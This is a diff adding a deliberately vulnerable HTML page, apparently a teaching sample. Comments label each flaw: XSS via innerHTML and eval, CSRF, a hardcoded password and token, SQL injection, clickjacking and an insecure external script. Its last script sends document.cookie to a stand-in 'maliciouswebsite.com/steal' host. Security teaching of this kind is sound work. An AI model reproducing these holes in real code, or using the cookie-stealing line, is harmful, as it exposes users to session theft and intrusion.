@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Insecure Web Page</title>
+    <script>
+        // Vulnerable to XSS
+        function greetUser() {
+            var name = document.getElementById('username').value;
+            document.getElementById('greeting').innerHTML = "Hello, " + name + "!";
+        }
+
+        // Vulnerable to CSRF
+        function transferMoney() {
+            var amount = document.getElementById('amount').value;
+            fetch('http://insecurebank.com/transfer', {
+                method: 'POST',
+                body: JSON.stringify({ amount: amount }),
+                headers: { 'Content-Type': 'application/json' }
+            });
+        }
+    </script>
+</head>
+<body>
+    <h1>Welcome to Insecure Web Page</h1>
+
+    <!-- Insecure form vulnerable to XSS -->
+    <form onsubmit="greetUser(); return false;">
+        <label for="username">Enter your name:</label>
+        <input type="text" id="username" name="username">
+        <input type="submit" value="Greet Me">
+    </form>
+    <p id="greeting"></p>
+
+    <!-- Storing sensitive information in the HTML -->
+    <div style="display:none;">
+        <p id="userPassword">Password123!</p>
+        <p id="userToken">abcd1234</p>
+    </div>
+
+    <!-- Insecure form for money transfer -->
+    <form onsubmit="transferMoney(); return false;">
+        <label for="amount">Enter amount to transfer:</label>
+        <input type="text" id="amount" name="amount">
+        <input type="submit" value="Transfer Money">
+    </form>
+
+    <script>
+        // Vulnerable to SQL Injection
+        function getUserData() {
+            var userId = document.getElementById('userId').value;
+            fetch('http://insecureweb.com/getUserData?id=' + userId)
+                .then(response => response.json())
+                .then(data => {
+                    document.getElementById('userData').innerText = JSON.stringify(data);
+                });
+        }
+    </script>
+
+    <!-- Insecure form vulnerable to SQL Injection -->
+    <form onsubmit="getUserData(); return false;">
+        <label for="userId">Enter User ID:</label>
+        <input type="text" id="userId" name="userId">
+        <input type="submit" value="Get User Data">
+    </form>
+    <p id="userData"></p>
+
+    <!-- Vulnerable to clickjacking -->
+    <iframe src="http://insecurebank.com" style="width:500px; height:500px;"></iframe>
+
+    <!-- Insecure external script inclusion -->
+    <script src="http://insecurewebsite.com/insecure.js"></script>
+
+    <!-- Insecure eval usage -->
+    <script>
+        var userScript = prompt("Enter some JavaScript code to execute:");
+        eval(userScript);  // Vulnerable to XSS
+    </script>
+
+    <!-- Insecure use of innerHTML -->
+    <script>
+        document.getElementById('greeting').innerHTML = "<img src='http://maliciouswebsite.com/steal?cookie=" + document.cookie + "'>";
+    </script>
+</body>
+</html>
